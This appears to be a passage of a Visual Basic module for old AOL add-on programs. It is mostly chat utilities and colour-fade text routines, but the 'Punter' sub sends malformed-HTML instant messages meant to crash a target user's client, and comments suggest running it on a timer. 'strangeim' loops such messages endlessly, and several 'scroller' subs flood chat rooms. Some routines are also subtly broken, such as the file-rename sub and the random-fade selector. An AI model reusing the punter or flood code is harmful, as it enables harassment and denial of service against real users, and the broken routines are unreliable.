TabPage& = Findchildbyclass(TabControl&, "_AOL_TabPage")
Tree& = Findchildbyclass(TabPage&, "_AOL_Tree")
If MailPar& <> 0 And TabControl& <> 0 And TabPage& <> 0 And Tree& <> 0 Then Exit Do
Loop
Timeout 5
sBuffer = SendMessage(Tree&, &H18B, 0, 0&)
If sBuffer > 1 Then
MsgBox "You have " & sBuffer & " messages in your Mailbox.", vbInformation
GoTo Closer
End If
If sBuffer = 1 Then
MsgBox "You have one message in your Mailbox.", vbInformation
GoTo Closer
End If
If sBuffer < 1 Then
MsgBox "You have no messages in your Mailbox.", vbInformation
GoTo Closer
End If
Closer:
ret& = SendMessage(MailPar&, &H10, 0, 0&)
End Function

Function GetText(child)
GetTrim = SendMessageByNum(child, 14, 0&, 0&)
TrimSpace$ = Space$(GetTrim)
GetString = SendMessageByString(child, 13, GetTrim + 1, TrimSpace$)
GetText = TrimSpace$
End Function

Function GetchatText()
room% = FindChatRoom
AORich% = Findchildbyclass(room%, "RICHCNTL")
chattext = GetText(AORich%)
GetchatText = chattext
End Function

Function LastChatLineWithSN()
'duh this will get the text from
'the last chatline with the sn
' used in many bots and shit like that
chattext$ = GetchatText

For FindChar = 1 To Len(chattext$)

thechar$ = Mid(chattext$, FindChar, 1)
thechars$ = thechars$ & thechar$

If thechar$ = Chr(13) Then
TheChatText$ = Mid(thechars$, 1, Len(thechars$) - 1)
thechars$ = ""
End If

Next FindChar

lastlen = Val(FindChar) - Len(thechars$)
lastline = Mid(chattext$, lastlen, Len(thechars$))

LastChatLineWithSN = lastline
End Function

Function SNFromLastChatLine()
chattext$ = LastChatLineWithSN
ChatTrim$ = Left$(chattext$, 11)
For Z = 1 To 11
    If Mid$(ChatTrim$, Z, 1) = ":" Then
        sn = Left$(ChatTrim$, Z - 1)
    End If
Next Z
SNFromLastChatLine = sn
End Function

Function LastChatLine()
'duh this will get the text from
'the last chatline , used in many
'bots and shit like that
chattext = LastChatLineWithSN
ChatTrimNum = Len(SNFromLastChatLine)
ChatTrim$ = Mid$(chattext, ChatTrimNum + 4, Len(chattext) - Len(SNFromLastChatLine))
LastChatLine = ChatTrim$
End Function

Sub AddRoomToListBox(ListBox As ListBox)
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
thelist.Clear
budlist% = findchildbytitle(AOLMDI(), "Buddy List Window")
room = FindChatRoom()
aolhandle = Findchildbyclass(room, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
If Person$ = UserSN Then GoTo Na
ListBox.AddItem "(" & Person$ & ")"
Na:
Next index
Call CloseHandle(AOLProcessThread)
End If

End Sub
Sub Kill_KW_not_found_msg()
'hey I don't get y ne1 would wanna
'kill it but I have been asked like
'30 times by different peeps so here
'I added a sub for it
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = Findchildbyclass(aol%, "MDIClient")
NF% = findchildbytitle(mdi%, "keyword Not Found")
Call AOLKillWindow(NF%)
End Sub
Sub Rollform2(frm As Form, steps As String, finish As String)
Do
frm.Height = frm.Height - steps
Loop Until frm.Height = finish
'Finish should never be less than 405
'if u use a # less than that it will
'lock up VB on ya
'Steps are how many steps u wanna -
'Example of code
'Rollform2 Form1 , 10 , 500

End Sub

Function PlayAvi()
'Plays a AVI File Change the path Below to your
'AVI Path
lRet = MciSendString("play c:\RaVaGe.avi", 0&, 0, 0)
End Function
Function PlayMidi()
'Plays a Midi File Change the path Below to your
'Midi Path
lRet = MciSendString("play C:\RaVaGe.mid", 0&, 0, 0) ' or whatever the File Name is
End Function

Sub Form_Scroll2(frm As Form, finished)
' This will make the form slowly scroll down
' you can add a timeout to make it go slower
' or faster
' Call Call Form_Scroll2(Form1, 1000)
If frm.Height > finished Then Exit Sub
If frm.Height = finished Then Exit Sub
Do
frm.Height = Val(frm.Height) + 1
Loop Until frm.Height = finished
End Sub
Sub Form_Scroll(frm As Form, finished)
' This will make the form slowly scroll up
' you can add a timeout to make it go slower
' or faster
' Call Form_Scroll(Form1, 1000)
If frm.Height < finished Then Exit Sub
If frm.Height = finished Then Exit Sub
Do
frm.Height = Val(frm.Height) - 1
Loop Until frm.Height = finished
End Sub
Sub Killbuddychats()

aol% = FindWindow("AOL Frame25", 0&)
CloseBuddy% = findchildbytitle(aol%, "Invitation from: ")
c% = SendMessageByNum(CloseBuddy%, WM_CLOSE, 0, 0)
End Sub

Sub macrokilla(Txt As TextBox)

Dim TheString$
TheString$ = "txt.text"
SendChat TheString$
SendChat TheString$
SendChat TheString$
SendChat TheString$
Timeout 1.5
End Sub




Sub AddbuddiesToListBox(ListBox As ListBox)
'I was ask how to do it so
'I just added it
On Error Resume Next

Dim AOLProcess As Long
Dim ListItemHold As Long
Dim Person As String
Dim ListPersonHold As Long
Dim ReadBytes As Long
thelist.Clear
budlist% = findchildbytitle(AOLMDI(), "Buddy List Window")

aolhandle = Findchildbyclass(budlist%, "_AOL_Listbox")

AOLThread = GetWindowThreadProcessId(aolhandle, AOLProcess)
AOLProcessThread = OpenProcess(PROCESS_VM_READ Or STANDARD_RIGHTS_REQUIRED, False, AOLProcess)

If AOLProcessThread Then
For index = 0 To SendMessage(aolhandle, LB_GETCOUNT, 0, 0) - 1
Person$ = String$(4, vbNullChar)
ListItemHold = SendMessage(aolhandle, LB_GETITEMDATA, ByVal CLng(index), ByVal 0&)
ListItemHold = ListItemHold + 24
Call ReadProcessMemory(AOLProcessThread, ListItemHold, Person$, 4, ReadBytes)
                        
Call RtlMoveMemory(ListPersonHold, ByVal Person$, 4)
ListPersonHold = ListPersonHold + 6

Person$ = String$(16, vbNullChar)
Call ReadProcessMemory(AOLProcessThread, ListPersonHold, Person$, Len(Person$), ReadBytes)

Person$ = Left$(Person$, InStr(Person$, vbNullChar) - 1)
If Person$ = UserSN Then GoTo Na
ListBox.AddItem Person$
Na:
Next index
Call CloseHandle(AOLProcessThread)
End If

End Sub
Sub strangeim(stuff)
'I can't rember where I got this
'sub from but this is not one of mine
'thanxz to who ever I got it from
Do:
DoEvents
Call IMKeyword(stuff, "<body bgcolor=#000000>")
Call IMKeyword(stuff, "<body bgcolor=#0000FF>")
Call IMKeyword(stuff, "<body bgcolor=#FF0000>")
Call IMKeyword(stuff, "<body bgcolor=#00FF00>")
Call IMKeyword(stuff, "<body bgcolor=#C0C0C0>")
Loop 'This will loop untill a stop button is pressed.
End Sub

Public Sub eightLine(Txt As TextBox)
'a simple 8 line scroller
a = String(116, Chr(32))
d = 116 - Len(Txt)
c$ = Left(a, d)
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""

SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""

SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""

SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 2

End Sub


Public Sub FifteenLine(Txt As TextBox)
a = String(116, Chr(32))
d = 116 - Len(Txt)
c$ = Left(a, d)
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 1.5
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$
Timeout 1.5
End Sub
Public Sub FiveLine(Txt As TextBox)
a = String(116, Chr(32))
d = 116 - Len(Txt)
c$ = Left(a, d)
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$
Timeout 0.3
End Sub




Public Sub SixTeenLine(Txt As TextBox)
a = String(116, Chr(32))
d = 116 - Len(Txt)
c$ = Left(a, d)
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.7
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.7
End Sub





Sub PWS_Scan(flename, Txt As TextBox)
'I really don't wanna do this but
'I have been asked about a million
'times how to use this sub with
'dir_list's and shit So here is
'my full code for My PwSd

'Private Sub Dir1_Change()
'File1 = Dir1
'End Sub

'Private Sub Drive1_Change()
'Dir1 = Drive1
    'End Sub

'Private Sub Form_Load()
'StayOnTop Me
'End Sub


'Private Sub Timer1_Timer()
'Note: the timer is set at 1
'Text1.text = Dir1 & File1
'End Sub

'Private Sub Command1_Click()

'PWS_Scan Text1, Text1
'End Sub


'Ok I said full but hey what u expect
'Did u really think I was gonna give u the
'Full code.. If u can't get it from there u
'Shouldn't be proggin
If Txt.Text = "" Then
MsgBox "You Have To Select A File"
Exit Sub
End If
bwap = "check"
yo = "mail"
nutts = "you've"
nutts2 = "&sent"
heya = bwap & " " & yo & " " & nutts & " " & nutts2
Txt.Text = LCase(Txt.Text)
BoldFadeBlack "·÷^·• RaVaGe  -^-› [pws scanner]"
BoldFadeBlack "[Scanning" & flename & "]"
hello = Txt.Text
Timeout 2
Open hello For Binary As #1
lent = FileLen(hello)

For i = 1 To lent Step 32000
  
  Temp$ = String$(32000, " ")
  Get #1, i, Temp$
  Temp$ = LCase$(Temp$)
  If InStr(Temp$, heya) Then
  Timeout 1
    Close
  Timeout 1
    BoldFadeBlack "·÷^·• RaVaGe  -^-› [pws scanner]"
    BoldFadeRed "·÷^·• RaVaGe  -^-› [pws detected]"
    mb1 = MsgBox(flename & " Is A Password Stealer Do You Wan't To Delete It?", 36, "RaVaGe pws detector")
    Select Case mb1
    Case 6:
    Timeout 1
    BoldFadeBlack "·÷^·• RaVaGe  -^-› [pws scanner]"
   BoldFadeBlack "·÷^·• RaVaGe  -^-› [pws deleted]"
    Kill "" & Txt.Text
    MsgBox "The Password Stealer Has Been Removed", 16, "RaVaGe pws detector"
    Case 7: Exit Sub
    End Select
    Exit Sub
  End If
  i = i - 50
Next i
Close
Timeout 2.9
MsgBox flename & " Is Not A Password Stealer", 16, "RaVaGe pws detector"
r_Rainbow (flename & " Is Not A Password Stealer")
End Sub
Sub EXE_OPEN(What$)
On Error GoTo 10
X = Shell(What$, 1)
Exit Sub
10:
MsgBox What$ + ", Was not found.", 16, "Error"
Exit Sub
End Sub


Public Sub TenLine(Txt As TextBox)
a = String(116, Chr(32))
d = 116 - Len(Txt)
c$ = Left(a, d)
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 1.5
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
End Sub

Public Sub ThirtyFiveLine(Txt As TextBox)
a = String(116, Chr(4))
d = 116 - Len(Txt)
c$ = Left(a, d)
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 1.5
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 1.5
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 1.5
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 1.5
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$
Timeout 0.3
End Sub

Public Sub TwentyFiveLine(Txt As TextBox)
a = String(116, Chr(32))
d = 116 - Len(Txt)
c$ = Left(a, d)
SendChat "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + ""
Timeout 1.5
SendChat "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + ""
Timeout 1.5
SendChat "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + ""
Timeout 1.5

End Sub


Public Sub TwentyLine(Txt As TextBox)
a = String(116, Chr(32))
d = 116 - Len(Txt)
c$ = Left(a, d)
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 1.5
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 1.5
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
SendChat "" + Txt.Text + "" & c$ & "" + Txt.Text + ""
Timeout 0.3
End Sub

Function Scrambletext(TheText)
'sees if there's a space in the text to be scrambled,
'if found space, continues, if not, adds it
findlastspace = Mid(TheText, Len(TheText), 1)

If Not findlastspace = " " Then
TheText = TheText & " "
Else
TheText = TheText
End If

'Scrambles the text
For scrambling = 1 To Len(TheText)
DoEvents
thechar$ = Mid(TheText, scrambling, 1)
Char$ = Char$ & thechar$

If thechar$ = " " Then
'takes out " " space from the text left of the space
chars$ = Mid(Char$, 1, Len(Char$) - 1)
'gets first character
firstchar$ = Mid(chars$, 1, 1)
'gets last character (if not, makes first character only)
On Error GoTo cityz
lastchar$ = Mid(chars$, Len(chars$), 1)

'finds what is inbetween the last and first character
midchar$ = Mid(chars$, 2, Len(chars$) - 2)
'reverses the text found in between the last and first
'character
For SpeedBack = Len(midchar$) To 1 Step -1
DoEvents
backchar$ = backchar$ & Mid$(midchar$, SpeedBack, 1)
Next SpeedBack
GoTo sniffe

'adds the scrambled text to the full scrambled element
cityz:
scrambled$ = scrambled$ & firstchar$ & " "
GoTo sniffs

sniffe:
scrambled$ = scrambled$ & lastchar$ & firstchar$ & backchar$ & " "

'clears character and reversed buffers
sniffs:
Char$ = ""
backchar$ = ""
End If

Next scrambling
'Makes function return value the scrambled text
Scrambletext = scrambled$

Exit Function
End Function
Function DescrambleText(TheText)
'sees if there's a space in the text to be scrambled,
'if found space, continues, if not, adds it
findlastspace = Mid(TheText, Len(TheText), 1)

If Not findlastspace = " " Then
TheText = TheText & " "
Else
TheText = TheText
End If

'Descrambles the text
For scrambling = 1 To Len(TheText)
DoEvents
thechar$ = Mid(TheText, scrambling, 1)
Char$ = Char$ & thechar$

If thechar$ = " " Then
'takes out " " space from the text left of the space
chars$ = Mid(Char$, 1, Len(Char$) - 1)
'gets first character
firstchar$ = Mid(chars$, 1, 1)
'gets last character (if not, makes first character only)
On Error GoTo city
lastchar$ = Mid(chars$, 2, 1)
'finds what is inbetween the last and first character
midchar$ = Mid(chars$, 3, Len(chars$) - 2)
'reverses the text found in between the last and first
'character
For SpeedBack = Len(midchar$) To 1 Step -1
DoEvents
backchar$ = backchar$ & Mid$(midchar$, SpeedBack, 1)
Next SpeedBack
GoTo sniffed

'adds the scrambled text to the full scrambled element
city:
scrambled$ = scrambled$ & firstchar$ & " "
GoTo sniff

sniffed:
scrambled$ = scrambled$ & lastchar$ & backchar$ & firstchar$ & " "

'clears character and reversed buffers
sniff:
Char$ = ""
backchar$ = ""
End If

Next scrambling
'Makes function return value the scrambled text
DescrambleText = scrambled$

End Function


Sub Directory_Create(dir)
'This will add a directory to your system
'Example of what it should look like:
'Call Directory_Create("C:\My Folder\NewDir")
MkDir dir
End Sub

Sub Directory_Delete(dir)
'This deletes a directory automatically from your HD
RmDir (dir)
End Sub


Sub File_Delete(File)
'This will delete a file straight from the users HD
Kill (File)
End Sub
Sub File_Open(File)
'This will open a file... whole dir and file name needed
Shell (File)
End Sub
Sub File_ReName(sFromLoc As String, sToLoc As String)
'This will immediately rename a file for you
Name sOldLoc As sNewLoc
End Sub



Sub Window_Hide(hwnd)
'This will hide the window of your choice
X = ShowWindow(hwnd, SW_HIDE)
End Sub



Sub Window_Show(hwnd)
'This will show the window of your choice
X = ShowWindow(hwnd, SW_SHOW)
End Sub

Sub AOL40_Load()
'This will load AOL4.0
X% = Shell("C:\aol40\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol40a\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol40b\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
End Sub

Sub PhreakyAttention(Text)

SendChat ("<b>¤</b><i> ¤</i><u> ¤</u><s> ¤</s> " & Text & " <s>¤</s><u> ¤</u><i> ¤</i><b> ¤</b>")
SendChat ("<B>" & Text)
SendChat ("<I>" & Text)
SendChat ("<U>" & Text)
SendChat ("<S>" & Text)
SendChat ("<b>¤</b><i> ¤</i><u> ¤</u><s> ¤</s> " & Text & " <s>¤</s><u> ¤</u><i> ¤</i><b> ¤</b>")
End Sub

Sub Punter(sn)
'this is a fun  punt string
' it is best to put it in a
'timer... Make sure u have a
'stop button or it will just keep goin
Dim Punt
Punt = "</P><P ALIGN=CENTER><font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>"
'that made it so I din't have
'to type as much shit below

Dim pu
pu = "<P><body bgcolor=#000000><HTML><HTML><P><body bgcolor=#0000FF><HTML><HTML><P><body bgcolor=#FF0000><HTML><HTML><P><body bgcolor=#00FF00><HTML><HTML><P><body bgcolor=#C0C0C0><P><body bgcolor=#000000><HTML><HTML><P><body bgcolor=#0000FF><HTML><HTML><P><body bgcolor=#FF0000><HTML><HTML><P><body bgcolor=#00FF00><HTML><HTML><P><body bgcolor=#C0C0C0><font = 9999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999>"
If sn = "Ravagevbx" Then
Call IMKeyword(UserSN, pu)
Call IMKeyword(UserSN, Punt)
Else
Call ChangeCaption(IM%, "U are Owned By RaVaGe " & UserSN & "!!!")
Call IMKeyword(sn, pu)
Call IMKeyword(sn, Punt)
End If
End Sub


Sub AOL4_Invite(Person)
'This will send an Invite to a person
'werks good for a pinter if u use a timer
FreeProcess
On Error GoTo ErrHandler
aol% = FindWindow("AOL Frame25", vbNullString)
mdi% = Findchildbyclass(aol%, "MDIClient")
bud% = findchildbytitle(mdi%, "Buddy List Window")
e = Findchildbyclass(bud%, "_AOL_Icon")
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
e = GetWindow(e, GW_HWNDNEXT)
ClickIcon (e)
Timeout (1#)
chat% = findchildbytitle(mdi%, "Buddy Chat")
aoledit% = Findchildbyclass(chat%, "_AOL_Edit")
If chat% Then GoTo FILL
FILL:
Call AOL4_SetText(aoledit%, Person)
de = Findchildbyclass(chat%, "_AOL_Icon")
ClickIcon (de)
Killit% = findchildbytitle(mdi%, "Invitation From:")
AOL4_KillWin (Killit%)
FreeProcess
ErrHandler:
Exit Sub
End Sub

Sub AOL4_SetText(win, Txt)
'This is usually used for an _AOL_Edit or RICHCNTL
TheText% = SendMessageByString(win, WM_SETTEXT, 0, Txt)
End Sub

Sub AOL4_KillWin(Windo)
'Closes a window....ex: AOL4_Killwin (IM%)
CloseTheMofo = SendMessageByNum(Windo, WM_CLOSE, 0, 0)
End Sub

Function Saying()
'This will generate a random saying
'werks good for an 8 ball bot
Dim l003A As Variant
Randomize Timer
l003A = Int(Rnd * 8)
Select Case l003A
Case 1: SendChat "<B>-=8=--Hmm.....ask again Later"
Case 2: SendChat "<B>-=8=--Yeah baby!"
Case 3: SendChat "<B>-=8=--YES!"
Case 4: SendChat "<B>-=8=--NO!"
Case 5: SendChat "<B>-=8=--It looks to be in your favor!"
Case 6: SendChat "<B>-=8=--If you only knew! };-)"
Case 7: SendChat "<B>-=8=--GUESS WHAT! I don't care"
Case Else: SendChat "<B>-=8=--Sorry! Not this time."
End Select
End Function
Function Saying2()
'This will generate a random saying
'werks good for a drug bot
Dim l003A As Variant
Randomize Timer
l003A = Int(Rnd * 8)
Select Case l003A
Case 1: SendChat "<B>-=8=--U get a big fat <(((((Joint))))))>"
Case 2: SendChat "<B>-=8=--U get  Acid"
Case 3: SendChat "<B>-=8=--U get a  -----(  Needle  )--|"
Case 4: SendChat "<B>-=8=-- U get shrooms"
Case 5: SendChat "<B>-=8=-- Hehe U overdosed"
Case 6: SendChat "<B>-=8=--U get pills () to pop"
Case 7: SendChat "<B>-=8=--Fugg u u are a nark and get nuttin"
Case Else: SendChat "<B>-=8=-- U get a big fat Crack roc"
End Select
End Function
Function BoldBlack_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(f, f, f - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (msg)
End Function



Function BoldYellowPinkYellow(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(78, 255 - f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (msg)
End Function

Function BoldWhitePurpleWhite(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, 255 - f, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
    WhitePurpleWhite (msg)
End Function

Function BoldLBlue_Green_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
    LBlue_Green_LBlue (msg)
End Function

Function BoldLBlue_Yellow_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 255, f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
    LBlue_Yellow_LBlue (msg)
End Function

Function BoldPurple_LBlue_Purple()
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255, f, 255 - f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
  BoldSendChat (msg)
End Function

Function BoldDBlue_Black_DBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 450 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 0, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldDBlue_Black_DBlue = (msg)
End Function

Function BoldDGreen_Black(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(0, f - f, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function



Function BoldLBlue_Orange(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(255 - f, 155, f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
    LBlue_Orange (msg)
End Function



Function BoldLBlue_Orange_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(255 - f, 155, f)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
    LBlue_Orange_LBlue (msg)
End Function

Function BoldLGreen_DGreen(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 220 / a
        f = e * b
        G = RGB(0, 375 - f, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
    BoldSendChat (msg)
End Function

Function BoldLGreen_DGreen_LGreen(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 490 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(0, 375 - f, 0)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
    r_elite (msg)
End Function

Function BoldLBlue_DBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 255 / a
        f = e * b
        G = RGB(355, 255 - f, 55)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
 BoldSendChat (msg)
End Function

Function BoldLBlue_DBlue_LBlue(Text1)
    a = Len(Text1)
    For b = 1 To a
        c = Left(Text1, b)
        d = Right(c, 1)
        e = 510 / a
        f = e * b
        If f > 255 Then f = (255 - (f - 255))
        G = RGB(355, 255 - f, 55)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & d
    Next b
BoldSendChat (msg)
End Function
Function RandomFade(Text1 As String)


Dim l003A As Variant
Randomize Timer
l003A = Int(Rnd * 8)
Select Case l003A
Case 1: BoldYellowBlackYellow (Text1)
    Case 2: BoldPurpleRedPurple (Text1)
 Case 3: BoldBlueBlackBlue (Text1)
    Case 4: BoldRedBlue (Text1)
   Case 5: BoldPurpleGreen (Text1)
   
Case 6: BoldPurpleRed (Text1)
   Case 7: BoldPurpleBluePurple (Text1)
    Case 8: BoldYellowBlueYellow (Text1)
   Case 9:  r_Color (Text1)
    Case 10: BoldLBlue_Orange_LBlue (Text1)
   Case 11: BoldLGreen_DGreen (Text1)
   Case 12: BoldLGreen_DGreen_LGreen (Text1)
    Case 13: BoldLBlue_DBlue (Text1)
    Case 14: BoldLBlue_DBlue_LBlue (Text1)
    Case 15: BoldPinkOrange (Text1)
   Case 16: BoldPinkOrangePink (Text1)
